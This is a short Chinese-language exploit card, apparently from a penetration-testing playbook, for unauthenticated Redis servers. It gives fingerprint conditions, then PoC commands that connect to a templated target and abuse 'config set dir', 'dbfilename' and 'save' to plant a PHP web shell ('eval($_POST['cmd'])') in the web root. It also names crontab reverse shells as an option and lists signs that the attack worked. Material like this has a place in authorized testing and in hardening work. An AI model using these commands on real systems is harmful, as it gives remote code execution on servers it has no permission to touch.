# Redis 未授权访问 (4-unacc)

## 指纹特征
- 服务: Redis
- 端口: 6379 (默认)
- 条件: 配置 `protected-mode no` 且无密码校验

## 利用矩阵
| 触发方式 | 依赖条件 | 目的 |
| :--- | :--- | :--- |
| 直接连接 | 服务未配置认证 | 获取 Redis 数据 / 写入 WebShell |

## PoC 指令

通过连接 Redis 服务器执行指令，通常用于写入 WebShell 或通过 crontab 反弹 Shell。

**1. 连接 Redis**
```bash
redis-cli -h {{TARGET}}
```

**2. 写入 WebShell (PHP环境)**
```redis
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php eval($_POST['cmd']); ?>"
save
```

## Success Signal
- **物理验证**: 在 Web 目录下创建了 `shell.php`，并可通过 HTTP 访问。
- **状态验证**: 成功执行 `info` 命令获取服务器详细信息。
